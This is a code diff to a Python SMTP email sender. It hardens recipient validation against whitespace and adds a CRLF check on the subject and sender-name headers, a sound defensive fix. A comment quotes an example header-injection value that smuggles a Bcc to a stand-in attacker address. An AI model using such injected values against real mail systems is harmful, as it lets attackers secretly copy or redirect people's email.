@@ -56,16 +56,30 @@ class SMTPEmailSender(EmailSenderBase):
         if not self.smtp_user or not self.smtp_pass:
             return {"status": "error", "error": "SMTP credentials not configured."}
 
-        if not re.match(r'^[^@]+@[^@]+\.[^@]+$', to):
-            return {"status": "error", "error": f"Invalid email format: {to}"}
+        # `[^@\s]` excludes whitespace so `\r`/`\n` can't slip through and
+        # let an attacker-controlled lead email inject Cc/Bcc/Subject
+        # headers via `victim@x.com\r\nBcc: attacker@evil.com`. Recipient
+        # passes through `msg["To"] = to` and SMTP RCPT verbatim, so the
+        # boundary check has to be strict.
+        if not re.match(r'^[^@\s]+@[^@\s]+\.[^@\s]+$', to):
+            return {"status": "error", "error": "Invalid email format."}
 
         if to in self.bounced_emails:
             return {"status": "bounced", "error": f"{to} is in bounce list."}
 
+        # CRLF guard on every header value we feed MIMEMultipart. Subject
+        # is Gemini-drafted (sees attacker-controlled lead fields) and
+        # from_name can also be overridden per-send. Header injection at
+        # this layer would let a single poisoned lead row alter every
+        # subsequent recipient on the message.
+        sender_name = from_name or self.from_name
+        for header_value in (subject, sender_name):
+            if any(ch in header_value for ch in ('\r', '\n')):
+                return {"status": "error", "error": "Invalid header value (CRLF)."}
+
         await self._wait_for_rate_limit()
 
         try:
-            sender_name = from_name or self.from_name
             msg = MIMEMultipart("alternative")
             msg["Subject"] = subject
             msg["From"] = f"{sender_name} <{self.from_email}>"
